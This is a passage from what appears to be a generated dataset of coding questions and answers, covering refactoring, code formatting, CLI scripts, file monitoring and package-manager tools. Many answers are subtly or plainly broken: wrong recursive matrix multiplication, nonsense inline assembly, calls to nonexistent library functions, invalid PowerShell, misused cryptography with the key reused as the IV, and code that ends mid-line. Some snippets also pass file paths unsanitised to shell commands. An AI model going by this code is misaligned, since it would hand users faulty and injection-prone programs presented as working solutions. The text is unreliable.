== 1 or len(matrix2[0]) == 1:\n        return [[matrix1[i][0] * matrix2[0][j] for j in range(len(matrix2[0]))] if len(matrix1) == 1 else [matrix1[0][j] * matrix2[i][0] for i in range(len(matrix1))]\n    else:\n        mid = len(matrix1[0]) // 2\n        matrix1a = [row[:mid] for row in matrix1]\n        matrix1b = [row[mid:] for row in matrix1]\n        matrix2a = [col[:mid] for col in matrix2]\n        matrix2b = [col[mid:] for col in matrix2]\n        result1 = multiply_matrices_recursive(matrix1a, matrix2a)\n        result2 = multiply_matrices_recursive(matrix1a, matrix2b)\n        result3 = multiply_matrices_recursive(matrix1b, matrix2a)\n        result4 = multiply_matrices_recursive(matrix1b, matrix2b)\n        return combine_matrices(result1, result2, result3, result4)\n\ndef combine_matrices(res1, res2, res3, res4):\n    return [[res1[i][j] + res2[i][j] + res3[i][j] + res4[i][j] for j in range(len(res1[0]))] for i in range(len(res1))]\n\n# Test the recursive function with the same input as the loop version\nmatrix1 = [[1, 2], [3, 4]]\nmatrix2 = [[5, 6], [7, 8]]\nprint(multiply_matrices_recursive(matrix1, matrix2))\n```\n\nQuestion 2:\nCreate a recursive function to reverse a linked list without using any additional data structures, temporary variables, or loops. The linked list nodes are defined as follows:\n\n```python\nclass Node:\n    def __init__(self, data=None):\n        self.data = data\n        self.next = None\n```\n\n```python\n# Example of a loop to reverse a linked list\ndef reverse_linked_list_loop(head):\n    prev = None\n    current = head\n    while current:\n        next_temp = current.next\n        current.next = prev\n        prev = current\n        current = next_temp\n    return prev\n\n# Recursive version to reverse a linked list\ndef reverse_linked_list_recursive(head, prev=None):\n    if not head:\n        return prev\n    next_node = head.next\n    head.next = prev\n    return reverse_linked_list_recursive(next_node, head)\n\n# Test the recursive function\nhead = Node(1)\nhead.next = Node(2)\nhead.next.next = Node(3)\nhead.next.next.next = Node(4)\n\nreversed_head = reverse_linked_list_recursive(head)\ncurrent = reversed_head\nwhile current:\n    print(current.data, end=\" -> \")\n    current = current.next\n```\n\nConcepts:\n1. {\"Concept\": \"Recursion\"}\n2. {\"Concept\": \"Matrix Multiplication\"}\n3. {\"Concept\": \"Linked List\"}"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Refactor for readability", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You have been provided with a piece of Python code that performs a mathematical operation to calculate the average of a list of numbers. The code is functional but not very readable. Refactor it to improve readability while preserving its functionality.\n\nOriginal Code:\n```python\ndef avg(lst):\n    s = 0\n    for i in lst:\n        s += i\n    return s / len(lst)\n```\n\nRefactored Code:\n```python\ndef calculate_average(numbers):\n    total = sum(numbers)\n    count = len(numbers)\n    return total / count\n```\nConcept: Refactor for readability\n\nQuestion 2:\nProblem: A given JavaScript function is responsible for validating a user's email address, but the code is difficult to understand due to the use of nested ternary operators and unclear variable names. Refactor the function to increase readability.\n\nOriginal Code:\n```javascript\nfunction isValidEmail(email) {\n    return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/.test(email) ? true : false;\n}\n```\n\nRefactored Code:\n```javascript\nfunction validateEmail(email) {\n    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;\n    return emailRegex.test(email);\n}\n```\nConcept: Refactor for readability"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Refactor for readability", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nSuppose you are given a highly optimized, yet unreadable C++ code snippet that implements a complex mathematical function using bit manipulation and inline assembly. The code is known to have a bug, but due to its obscurity, it's challenging to locate and fix. Refactor the code for readability while preserving its performance.\n\nOriginal code:\n```cpp\nint complexMath(int a, int b) {\n    int x = a, y = b, z = 0;\n    asm(\"\u79fb\u4f4d\u548c\u52a0\u6cd5\u64cd\u4f5c\"\n        : \"+r\"(x), \"+r\"(y), \"=r\"(z)\n        :\n        : \"cc\");\n    return x & ((1 << y) - 1);\n}\n```\nRefactored code:\n```cpp\n#include <cstdint>\n\nint complexMath(int a, int b) {\n    uint32_t result = a; // Use unsigned to avoid sign extension issues\n    const uint32_t mask = (1u << b) - 1u;\n\n    // Perform the custom operation\n    result = (result << b) | (result & mask);\n\n    // Return the result after applying the mask\n    return static_cast<int>(result & mask);\n}\n```\nConcept: Refactor for readability\n\nQuestion 2:\nGiven an obfuscated Python script that performs a complex string manipulation and regular expression matching. The code is difficult to understand, making debugging and maintenance challenging. Refactor the code for readability without significantly impacting its efficiency.\n\nOriginal code:\n```python\nimport re\n\ndef obsf_strManip(s):\n    r = re.compile(r'(\\w)(?=(\\w{3})+$)')\n    z = r.findall(s[::-1])[0][::-1]\n    return ''.join(c for c, _ in zip(s, z) if c != _)\n\nprint(obsf_strManip('abcdecba'))\n```\nRefactored code:\n```python\nimport re\n\ndef strManipWithRegex(s):\n    # Find the first word boundary in reversed input, then reverse again\n    reverse_word_boundary = re.compile(r'(\\w)(?=(\\w{3})+$)').search(s[::-1])\n    if reverse_word_boundary:\n        word_boundary = reverse_word_boundary.group(1)\n\n    # Create a tuple of characters where the first character doesn't match the word boundary\n    filtered_chars = (c for c, wb in zip(s, word_boundary) if c != wb)\n\n    # Join filtered characters and return\n    return ''.join(filtered_chars)\n\nprint(strManipWithRegex('abcdecba'))\n```\nConcept: Refactor for readability"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Refactor for performance", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You have a Python application with a function that processes a large list of numbers. The current implementation uses a linear search to find a target number, which is slow for large inputs. Refactor the function to improve performance.\n\nOriginal Code:\n```python\ndef linear_search(numbers, target):\n    for i in range(len(numbers)):\n        if numbers[i] == target:\n            return i\n    return -1\n```\nSolution (Refactored using Binary Search - Medium Complexity):\n```python\ndef binary_search(numbers, target):\n    left, right = 0, len(numbers) - 1\n\n    while left <= right:\n        mid = (left + right) // 2\n        if numbers[mid] == target:\n            return mid\n        elif numbers[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n\n    return -1\n```\nConcept: Binary Search\n\nQuestion 2:\nProblem: In a JavaScript application, there's a function that calculates the sum of all elements in an array. However, the current implementation uses recursion, which can lead to a stack overflow for large arrays. Refactor the function to use an iterative approach to improve performance.\n\nOriginal Code:\n```javascript\nfunction sumArrayRecursion(arr, acc = 0) {\n    if (arr.length === 0) return acc;\n    return sumArrayRecursion(arr.slice(1), acc + arr[0]);\n}\n```\nSolution (Refactored using an iterative approach - Medium Complexity):\n```javascript\nfunction sumArrayIteratively(arr) {\n    let sum = 0;\n    for (let i = 0; i < arr.length; i++) {\n        sum += arr[i];\n    }\n    return sum;\n}\n```\nConcept: Iterative Approach"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Refactor for performance", "Complexity_Level": "extremely difficult", "Response": "Question 1: Problem:\nA complex, highly nested loop structure in Python is causing significant performance degradation in a data processing application. The application reads large CSV files, performs multiple calculations on each row, and stores the result in a PostgreSQL database. The current implementation is slow due to excessive memory consumption, redundant computations, and inefficient I/O operations.\n\nSolution:\nRefactor the code to use generators, multiprocessing, and optimized database connection management. This will reduce memory usage, parallelize computation, and improve I/O performance.\n\nExample Python code:\n```python\nimport multiprocessing\nimport csv\nfrom contextlib import contextmanager\nimport psycopg2\n\n@contextmanager\ndef db_connection():\n    connection = psycopg2.connect(database=\"your_db\", user=\"your_user\", password=\"your_password\", host=\"your_host\", port=\"your_port\")\n    try:\n        yield connection\n    finally:\n        connection.close()\n\ndef process_row(row):\n    # Perform complex calculations on the row\n    result = row['column1'] * row['column2']\n    # Write the result to the database\n    with db_connection() as conn:\n        cursor = conn.cursor()\n        cursor.execute(\"INSERT INTO results (value) VALUES (%s)\", (result,))\n        conn.commit()\n\ndef read_and_process(file_path, num_processes):\n    with open(file_path, 'r') as file:\n        reader = csv.DictReader(file)\n        chunk_size = len(reader) // num_processes\n        chunks = [reader[i:i + chunk_size] for i in range(0, len(reader), chunk_size)]\n        with multiprocessing.Pool(processes=num_processes) as pool:\n            pool.starmap(process_row, [(chunk,) for chunk in chunks])\n\n# Refactored code usage\nread_and_process('large_data.csv', 4)\n```\nQuestion 2: Problem:\nAn AI model's inference time in a Python application is excessively high due to inefficient use of NumPy arrays, suboptimal model architecture, and non-parallelized computations. The application processes real-time video streams, making latency a critical concern.\n\nSolution:\nOptimize the NumPy operations, refactor the model to utilize a more efficient architecture, and employ multi-threading or GPU acceleration to speed up inference.\n\nExample Python code (using TensorFlow and multi-threading):\n```python\nimport numpy as np\nimport tensorflow as tf\nfrom threading import Thread\n\n# Load the optimized model\nmodel = tf.keras.models.load_model('optimized_model.h5')\n\ndef infer_frame(frame_data):\n    # Preprocess the frame\n    frame_array = preprocess(frame_data)\n    # Perform inference with the optimized model\n    inference_results = model.predict(np.array([frame_array]))\n    return inference_results\n\ndef process_video_stream(video_stream):\n    while True:\n        frame = video_stream.read()\n        if frame is None:\n            break\n        inference_thread = Thread(target=infer_frame, args=(frame,))\n        inference_thread.start()\n        inference_thread.join()\n        # Process inference results and do something with them\n\n# Initialize video stream\nvideo_stream = cv2.VideoCapture('rtsp://your_video_stream')\n\n# Process the video stream with the optimized inference function\nprocess_video_stream(video_stream)\n\n# Release the video stream\nvideo_stream.release()\n```\nNote: In both solutions, the optimizations are highly specific to the given problem and might not be applicable in all scenarios. The actual performance improvements will depend on the complexity of the calculations, the size of the input data, and the available hardware resources."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Standardize code formatting", "Complexity_Level": "medium", "Response": "Question 1: Problem\nYou are given a Python codebase with inconsistent formatting, including varying whitespace, line lengths, and indentation. Develop a script that standardizes the formatting to adhere to PEP 8 guidelines (using 4 spaces for indentation, maximum line length of 79 characters, etc.).\n\nSolution:\nConcept: Code Formatting, Linting, PEP 8\n\n```python\nimport re\nimport textwrap\n\ndef standardize_code(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n\n    # Replace tabs with spaces\n    code = re.sub(r'\\t', ' ' * 4, code)\n\n    # Split lines and reformat long lines\n    code_lines = code.splitlines()\n    code_lines = [textwrap.wrap(line, width=79) for line in code_lines if line.strip()]\n    code_lines = [' ' * 4 + line for sublist in code_lines for line in sublist]\n\n    # Remove trailing whitespaces and add newline at the end\n    code_lines = [line.rstrip() + '\\n' for line in code_lines]\n    code_lines[-1] = code_lines[-1].rstrip() + '\\n'\n\n    # Write formatted code back to the file\n    with open(file_path, 'w') as file:\n        file.writelines(code_lines)\n\n# Example usage\nstandardize_code('unformatted_code.py')\n```\nThis script reads a Python file, standardizes the code formatting according to PEP 8 guidelines, and writes the reformatted code back to the same file. It replaces tabs with spaces, wraps lines to a maximum length of 79 characters, removes trailing whitespaces, and ensures each file ends with a newline.\n\nQuestion 2: Problem\nGiven a JavaScript codebase with inconsistent formatting, create a Node.js script that uses ESLint to enforce a consistent style guide (e.g., Airbnb style guide).\n\nSolution:\nConcept: Code Formatting, Linting, ESLint\n\nFirst, install the necessary packages:\n\n```bash\nnpm init -y\nnpm install eslint eslint-config-airbnb-base eslint-plugin-import --save-dev\n```\n\nCreate an `.eslintrc.js` configuration file in the root directory:\n\n```javascript\nmodule.exports = {\n  'extends': 'airbnb-base',\n  'rules': {\n    'max-len': ['error', { 'code': 120, 'ignoreUrls': true, 'ignoreComments': false }]\n  }\n};\n```\nThis configuration extends the Airbnb base rules and sets the maximum line length to 120 characters.\n\nNext, create the Node.js script:\n\n```javascript\nconst fs = require('fs');\nconst path = require('path');\nconst { execSync } = require('child_process');\n\nconst projectRoot = __dirname;\nconst jsFiles = fs.readdirSync(projectRoot).filter((file) => file.endsWith('.js'));\n\nfor (const file of jsFiles) {\n  const filePath = path.join(projectRoot, file);\n  try {\n    execSync(`npx eslint --fix ${filePath}`, { stdio: 'inherit' });\n    console.log(`Formatted: ${filePath}`);\n  } catch (error) {\n    console.error(`Error formatting ${filePath}:`, error);\n  }\n}\n```\nThis script iterates through all `.js` files in the project directory, runs ESLint with the Airbnb style guide and the `--fix` flag to automatically fix formatting issues, and logs the results.\n\nExample usage:\n\n```bash\nnode format_code.js\n```\nThe script will format all JavaScript files in the project according to the Airbnb style guide."}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Standardize code formatting", "Complexity_Level": "extremely difficult", "Response": "**Concept: Code Formatting**\n\nQuestion 1: Develop a comprehensive code formatter that not only standardizes the formatting of a given codebase in Python but also enforces custom style guides, handles complex code structures, and supports code refactoring suggestions. The formatter should be able to detect and fix code inconsistencies, such as incorrect indentation, inconsistent whitespace, and inconsistent naming conventions.\n\nSolution:\n```python\nimport ast\nimport re\nfrom typing import List, Dict\n\nclass CustomFormatter:\n    def __init__(self, custom_styles: Dict[str, str]):\n        self.custom_styles = custom_styles\n\n    def format_code(self, code: str) -> str:\n        tree = ast.parse(code)\n        self._visit_node(tree)\n\n        fixed_code = ast.unparse(tree)\n        fixed_code = self._apply_custom_styles(fixed_code)\n        fixed_code = self._refactor_code(fixed_code)\n        return fixed_code\n\n    def _visit_node(self, node):\n        for attr, value in ast.iter_fields(node):\n            if isinstance(value, ast.AST):\n                self._visit_node(value)\n            elif isinstance(value, list):\n                for item in value:\n                    if isinstance(item, ast.AST):\n                        self._visit_node(item)\n\n        if isinstance(node, ast.ClassDef):\n            self._fix_class_def(node)\n        elif isinstance(node, ast.FunctionDef):\n            self._fix_function_def(node)\n        elif isinstance(node, ast.Expr):\n            self._fix_expr(node)\n        # Add more node types as needed\n\n    def _fix_class_def(self, node):\n        # Implement fix for class definitions\n        pass\n\n    def _fix_function_def(self, node):\n        # Implement fix for function definitions\n        pass\n\n    def _fix_expr(self, node):\n        # Implement fix for expressions\n        pass\n\n    def _apply_custom_styles(self, code: str) -> str:\n        for pattern, replacement in self.custom_styles.items():\n            code = re.sub(pattern, replacement, code)\n        return code\n\n    def _refactor_code(self, code: str) -> str:\n        # Implement code refactoring suggestions\n        return code\n\n\n# Example usage\ncustom_styles = {\n    r\"\\bdef\\b\": \"fn\",  # Replace \"def\" with \"fn\"\n    r\"\\s*=\\s*\": \" =\",  # Remove spaces around assignment operator\n}\n\nformatter = CustomFormatter(custom_styles)\nraw_code = \"\"\"\nclass MyClass:\n    def method(self):\n        if a  ==  b:\n            return a * b\n\"\"\"\n\nformatted_code = formatter.format_code(raw_code)\nprint(formatted_code)\n```\nThis is a simplified example of a custom formatter for Python code. The `CustomFormatter` class walks through the abstract syntax tree (AST) of the given code, allowing for manipulation of individual nodes. It has placeholder methods for fixing specific node types like class and function definitions, and expressions. The `_apply_custom_styles` method uses regular expressions to apply custom naming conventions, and `_refactor_code` is a placeholder for implementing code refactoring logic.\n\nQuestion 2: Implement a C++ code formatter that not only standardizes the formatting but also performs advanced analysis to suggest performance optimizations, such as identifying inefficient use of containers, memory management, and algorithmic improvements. The formatter should maintain compatibility with popular C++ standards (C++98, C++11, C++14, C++17, C++20) and integrate with popular C++ libraries (e.g., STL, Boost).\n\nSolution:\n```cpp\n#include <iostream>\n#include <string>\n#include <regex>\n#include <fstream>\n#include <vector>\n#include <unordered_map>\n\nclass CppFormatter {\npublic:\n    CppFormatter(const std::unordered_map<std::string, std::string>& custom_styles)\n        : custom_styles_(custom_styles) {}\n\n    std::string format_code(const std::string& code) {\n        // Parse and analyze code\n        //...\n\n        // Apply custom styles\n        for (const auto& [pattern, replacement] : custom_styles_) {\n            code = std::regex_replace(code, std::regex(pattern), replacement);\n        }\n\n        // Perform optimization suggestions\n        //...\n\n        return code;\n    }\n\nprivate:\n    void analyze_and_optimize(std::string& code) {\n        // Analyze for performance optimization opportunities\n        //...\n\n        // Apply optimizations\n        //...\n    }\n\n    std::unordered_map<std::string, std::string> custom_styles_;\n};\n\nint main() {\n    std::unordered_map<std::string, std::string> custom_styles = {\n        {\"std::vector\", \"std::deque\"},  // Replace vector with deque\n        {\"new\", \"std::make_unique<\"}   // Replace raw pointers with smart pointers\n    };\n\n    CppFormatter formatter(custom_styles);\n\n    std::ifstream file(\"input.cpp\");\n    std::string raw_code((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());\n    file.close();\n\n    std::string formatted_code = formatter.format_code(raw_code);\n\n    std::ofstream output(\"output.cpp\");\n    output << formatted_code;\n    output.close();\n\n    return 0;\n}\n```\nThis example demonstrates a basic structure for a C++ code formatter. It would require a more sophisticated parsing and analysis engine to identify performance optimization opportunities and maintain compatibility with different C++ standards and libraries. The current code is a placeholder, with methods `analyze_and_optimize` and `format_code` serving as entry points for the complex tasks."}, {"L2_TASK": "CLI", "L3_TASK": "Linux/Mac/Windows common CLI tasks", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Write a Bash script that finds all files with a specific file extension (e.g., .txt) in a given directory and its subdirectories, and then prints their full paths. Additionally, exclude any files that have \"temp\" in their names.\n\n```bash\n#!/bin/bash\n\n# Define the directory and file extension\ndirectory=\"$1\"\nfile_extension=\".txt\"\n\n# Find files with the given extension, excluding those containing \"temp\"\nfind \"$directory\" -type f -name \"*$file_extension\" ! -name \"*temp*\" -print\n```\nExplanation: The script uses the `find` command to search for files in the specified directory (`$directory`). `-type f` ensures that only files, not directories, are returned. `-name \"*$file_extension\"` matches files with the provided file extension. `! -name \"*temp*\"` excludes files that contain \"temp\" in their names. `-print` prints the full path of the matching files.\n\nUsage: Save the script as `find_files.sh` and make it executable with `chmod +x find_files.sh`. Then, run the script with the directory path as an argument, e.g., `./find_files.sh /path/to/directory`.\n\nQuestion 2:\nProblem: Create a PowerShell script for Windows that checks if a specific program (e.g., \"notepad.exe\") is currently running, and if not, it starts the program.\n\n```powershell\n# Define the program to check and start\nprogramPath = \"C:\\Windows\\System32\\notepad.exe\"\n\n# Check if the program is running\n$processes = Get-Process | Where-Object {$_.Name -eq \"notepad\"}\nif ($processes.count -eq 0) {\n    # Program is not running, start it\n    Start-Process -FilePath $programPath\n    Write-Host \"Started $programPath\"\n} else {\n    Write-Host \"$programPath is already running\"\n}\n```\nExplanation: The script uses the `Get-Process` cmdlet to retrieve all running processes and filters them based on the process name (\"notepad\"). If the count of these processes is 0, it means the program isn't running, and `Start-Process` is used to launch it. The script then outputs a message to indicate whether the program was started or is already running.\n\nUsage: Save the script as `check_start_program.ps1`. Right-click the file and select \"Run with PowerShell\" to execute it."}, {"L2_TASK": "CLI", "L3_TASK": "Linux/Mac/Windows common CLI tasks", "Complexity_Level": "extremely difficult", "Response": "Question 1: Implement a CLI tool that automates the process of recursively searching through a specified directory, identifying all files with a specific MIME type, and then compressing those files into a single archive while preserving the directory structure. The tool should also have an option to encrypt the compressed archive with a user-provided password using strong encryption.\n\nConcept: \"Command Line Interface\"\n\nSolution:\n```python\nimport os\nimport sys\nimport tarfile\nimport hashlib\nfrom cryptography.fernet import Fernet\nfrom email.mime import application\nfrom email import policy\n\ndef get_mime_type(filename):\n    with open(filename, 'rb') as f:\n        result = application._guess_maintype(f.read())\n    return result\n\ndef create_compressed_archive(input_dir, output_file, mime_type):\n    with tarfile.open(output_file, 'w:gz') as tar:\n        for root, dirs, files in os.walk(input_dir):\n            for file in files:\n                file_path = os.path.join(root, file)\n                if get_mime_type(file_path) == mime_type:\n                    tar.add(file_path, arcname=os.path.relpath(file_path, input_dir))\n\ndef encrypt_archive(archive_file, password):\n    key = Fernet.generate_key()\n    f = Fernet(key)\n    encrypted_data = f.encrypt(open(archive_file, 'rb').read())\n\n    with open(archive_file, 'wb') as ef:\n        ef.write(encrypted_data)\n\n    return key\n\ndef main():\n    if len(sys.argv) < 4:\n        print(\"Usage: python cli_tool.py <input_dir> <output_file> <mime_type> [password]\")\n        sys.exit(1)\n\n    input_dir = sys.argv[1]\n    output_file = sys.argv[2]\n    mime_type = sys.argv[3]\n    password = sys.argv[4] if len(sys.argv) > 4 else None\n\n    create_compressed_archive(input_dir, output_file, mime_type)\n    \n    if password:\n        key = encrypt_archive(output_file, password.encode('utf-8'))\n        print(f\"Archive encrypted. Store the key securely: {hashlib.sha256(key).hexdigest()}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nQuestion 2: Develop a CLI tool that monitors a designated directory for changes (file creation, deletion, and modification), and upon detection, performs a complex operation such as real-time transcoding of video files to a different format, while also maintaining a database of the last modified state of each file for efficient resuming in case of interruptions.\n\nConcept: \"Filesystem Monitoring\"\n\nSolution:\n```python\nimport os\nimport time\nimport subprocess\nfrom watchdog.observers import Observer\nfrom watchdog.events import FileSystemEventHandler\nfrom sqlalchemy import create_engine, Column, Integer, String, MetaData, Table, select\n\nclass VideoTranscodingHandler(FileSystemEventHandler):\n    def __init__(self, output_dir, db_connection_string):\n        self.output_dir = output_dir\n        self.engine = create_engine(db_connection_string)\n        self.metadata = MetaData(self.engine)\n        self.files_table = Table('files', self.metadata, autoload=True)\n\n    def on_modified(self, event):\n        if event.src_path.endswith(('.mp4', '.avi', '.mkv')) and not event.is_directory:\n            file_id_query = select([self.files_table.c.id]).where(self.files_table.c.path == event.src_path)\n            with self.engine.connect() as connection:\n                result = connection.execute(file_id_query)\n                file_id = result.fetchone()\n\n            if file_id is None:\n                self.process_file(event.src_path)\n            else:\n                print(f\"Resuming transcoding for {event.src_path}...\")\n\n    def on_created(self, event):\n        if event.src_path.endswith(('.mp4', '.avi', '.mkv')) and not event.is_directory:\n            self.process_file(event.src_path)\n\n    def process_file(self, file_path):\n        output_path = os.path.join(self.output_dir, os.path.basename(file_path).replace('.', '_transcoded.'))\n\n        # Run transcoding command (ffmpeg or other tool)\n        transcoding_command = f'ffmpeg -i \"{file_path}\" -c:v libx264 -preset slow -crf 22 -c:a aac -b:a 128k \"{output_path}\"'\n        subprocess.run(transcoding_command, shell=True)\n\n        # Store file info in the database\n        record = {'path': file_path, 'last_modified': int(os.path.getmtime(file_path))}\n        with self.engine.connect() as connection:\n            self.files_table.insert().values(record).execute()\n\nif __name__ == \"__main__\":\n    input_dir = '/path/to/monitor'\n    output_dir = '/path/to/output'\n    db_connection_string = 'sqlite:///file_monitor.db'  # Replace with your database connection string\n\n    event_handler = VideoTranscodingHandler(output_dir, db_connection_string)\n    observer = Observer()\n    observer.schedule(event_handler, input_dir, recursive=True)\n    observer.start()\n\n    try:\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        observer.stop()\n    observer.join()\n```\n\nNote: The solutions provided require the `watchdog` package for file system monitoring and `SQLAlchemy` for database operations. You can install them using `pip install watchdog SQLAlchemy`."}, {"L2_TASK": "CLI", "L3_TASK": "CLI package management", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a command-line interface (CLI) tool in Python that allows users to manage packages using a fictitious package manager called \"PyNix\". The tool should support installing, upgrading, and listing installed packages.\n\nConcept: Command-Line Interface (CLI)\n\nSolution:\n```python\nimport subprocess\nimport argparse\n\ndef install_package(package_name):\n    subprocess.run([\"pynix\", \"install\", package_name])\n\ndef upgrade_package(package_name):\n    subprocess.run([\"pynix\", \"upgrade\", package_name])\n\ndef list_packages():\n    output = subprocess.run([\"pynix\", \"list\"], capture_output=True, text=True)\n    return output.stdout.splitlines()\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"PyNix package manager CLI\")\n    subparsers = parser.add_subparsers(dest=\"command\")\n\n    install_parser = subparsers.add_parser(\"install\")\n    install_parser.add_argument(\"package\", help=\"Package to install\")\n\n    upgrade_parser = subparsers.add_parser(\"upgrade\")\n    upgrade_parser.add_argument(\"package\", help=\"Package to upgrade\")\n\n    list_parser = subparsers.add_parser(\"list\")\n\n    args = parser.parse_args()\n\n    if args.command == \"install\":\n        install_package(args.package)\n    elif args.command == \"upgrade\":\n        upgrade_package(args.package)\n    elif args.command == \"list\":\n        print(\"\\n\".join(list_packages()))\n\nif __name__ == \"__main__\":\n    main()\n```\nTo use the CLI tool, save it in a file named `pynix_cli.py`, then run the following commands in the terminal:\n\n```sh\n# Install a package\npython pynix_cli.py install numpy\n\n# Upgrade a package\npython pynix_cli.py upgrade requests\n\n# List installed packages\npython pynix_cli.py list\n```\nNote: This is a simple simulation and doesn't interact with an actual package manager like `pip`. In a real-world scenario, you would replace `subprocess.run([\"pynix\", ...])` calls with the actual package manager's API or CLI commands.\n\nQuestion 2:\nProblem: Create a Bash script to manage Node.js packages using npm. The script should handle installing, uninstalling, and checking the version of a package.\n\nConcept: Bash Scripting\n\nSolution:\n```bash\n#!/bin/bash\n\n# Check if a package name is provided\nif [ $# -eq 0 ]; then\n    echo \"Please provide a package name.\"\n    exit 1\nfi\n\npackage_name=\"$1\"\n\ncase \"$2\" in\n    install)\n        npm install --save \"$package_name\"\n        ;;\n    uninstall)\n        npm uninstall --save \"$package_name\"\n        ;;\n    version)\n        npm view \"$package_name\" version\n        ;;\n    *)\n        echo \"Invalid command. Available options: install, uninstall, version\"\n        exit 1\n        ;;\nesac\n```\nSave the script in a file named `npm_manager.sh`, and make it executable with `chmod +x npm_manager.sh`. Then, you can use it as follows:\n\n```sh\n# Install a package\n./npm_manager.sh express install\n\n# Uninstall a package\n./npm_manager.sh axios uninstall\n\n# Check a package version\n./npm_manager.sh chalk version\n```\nThis script takes two arguments: the package name and the action (install, uninstall, or version). It uses the `npm` command to perform the requested operations."}, {"L2_TASK": "CLI", "L3_TASK": "CLI package management", "Complexity_Level": "extremely difficult", "Response": "{\"Concept\": \"CLI Package Management\"}\n\nQuestion 1: Develop a CLI package manager that securely installs and manages private packages from a private repository, while enforcing fine-grained access control and providing an audit trail.\n\nSolution:\n```python\nimport os\nimport sys\nimport hashlib\nimport requests\nimport cryptography.fernet\nfrom cryptography.hazmat.primitives import padding\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\n\nclass PrivatePackageManager:\n    def __init__(self, repo_url, auth_token):\n        self.repo_url = repo_url\n        self.auth_token = auth_token\n        self.backend = default_backend()\n\n    def fetch_package_metadata(self, package_name):\n        headers = {'Authorization': f'Token {self.auth_token}'}\n        response = requests.get(f\"{self.repo_url}/packages/{package_name}/metadata\", headers=headers)\n        if response.status_code == 200:\n            return response.json()\n        else:\n            raise Exception(f\"Unable to fetch metadata: {response.text}\")\n\n    def download_package(self, package_name, package_version, destination):\n        headers = {'Authorization': f'Token {self.auth_token}'}\n        response = requests.get(f\"{self.repo_url}/packages/{package_name}/{package_version}/download\", headers=headers)\n        if response.status_code == 200:\n            with open(destination, 'wb') as f:\n                f.write(response.content)\n            return True\n        else:\n            raise Exception(f\"Unable to download package: {response.text}\")\n\n    def encrypt_package(self, source, destination, encryption_key):\n        with open(source, 'rb') as f:\n            data = f.read()\n\n        key = encryption_key.encode()\n        cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=self.backend)\n        encryptor = cipher.encryptor()\n        ciphertext = encryptor.update(data) + encryptor.finalize()\n\n        fernet_key = cryptography.fernet.Fernet.generate_key()\n        f = fernet_key\n        encrypted_cipher_key = f.encrypt(key)\n\n        with open(destination, 'wb') as f:\n            f.write(encrypted_cipher_key)\n            f.write(padding.PKCS7(128).pad(ciphertext, 128))\n\n    def decrypt_package(self, source, destination, encryption_key):\n        with open(source, 'rb') as f:\n            encrypted_cipher_key = f.read()[:32]\n            ciphertext = f.read()\n\n        fernet = cryptography.fernet.Fernet(encrypted_cipher_key)\n        cipher_key = fernet.decrypt(encrypted_cipher_key)\n        cipher = Cipher(algorithms.AES(cipher_key), modes.CBC(cipher_key[:16]), backend=self.backend)\n        decryptor = cipher.decryptor()\n\n        with open(destination, 'wb') as f:\n            plaintext = decryptor.update(ciphertext) + decryptor.finalize()\n            f.write(plaintext)\n\n    def install_package(self, package_name, package_version, destination, encryption_key):\n        metadata = self.fetch_package_metadata(package_name)\n        package_path = f\"{destination}/{package_name}-{package_version}.tar.gz\"\n        self.download_package(package_name, package_version, package_path)\n        self.decrypt_package(package_path, package_path, encryption_key)\n        # Perform actual installation logic (unzip, move files, etc.)\n        os.system(f\"tar -C {destination} -xzf {package_path}\")\n        print(f\"Package {package_name} v{package_version} installed successfully.\")\n\n# Example usage\npackage_manager = PrivatePackageManager('https://private-repo.example.com/api', 'your-auth-token')\nencryption_key = hashlib.sha256('your-security-password'.encode()).digest()\npackage_manager.install_package('mypackage', '1.2.3', '/usr/local/\n```"}, {"L2_TASK": "CLI", "L3_TASK": "Software development environment config", "Complexity_Level": "medium", "Response": "Question 1: Design a command-line interface (CLI) tool in Python that sets up a new development environment using virtualenv, installs a list of required packages, and creates a sample `requirements.txt` file.\n\nConcept: Command-line interface, Virtualenv, Python Package Installation\n\n```python\nimport os\nimport subprocess\n\ndef create_virtualenv(virtualenv_path):\n    subprocess.run([\"python3\", \"-m\", \"venv\", virtualenv_path])\n\ndef install_packages(virtualenv_path, packages):\n    activate_script = os.path.join(virtualenv_path, \"bin/activate\")\n    with open(activate_script, \"r\") as f:\n        activate_script_content = f.read()\n    if \"source\" in activate_script_content:\n        activate_command = f\". {activate_script}\"\n    else:\n        activate_command = f\"{activate_script}\"\n\n    subprocess.run([activate_command, \"-c\", \"pip install \" + \" \".join(packages)])\n\ndef create_requirements_file(virtualenv_path, packages):\n    requirements_path = os.path.join(virtualenv_path, \"requirements.txt\")\n    with open(requirements_path, \"w\") as f:\n        for package in packages:\n            f.write(f\"{package}\\n\")\n\ndef main():\n    project_name = input(\"Enter the name of your project: \")\n    virtualenv_path = f\"{project_name}/venv\"\n    packages = input(\"Enter the required packages separated by comma: \").split(\",\")\n    \n    create_virtualenv(virtualenv_path)\n    install_packages(virtualenv_path, packages)\n    create_requirements_file(virtualenv_path, packages)\n\n    print(f\"Successfully set up environment for {project_name} with packages: {', '.join(packages)}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nQuestion 2: Write a Bash script that configures a development environment by installing Node.js, initializing a new npm project, and adding a list of dependencies to the `package.json` file.\n\nConcept: Bash scripting, Node.js, npm 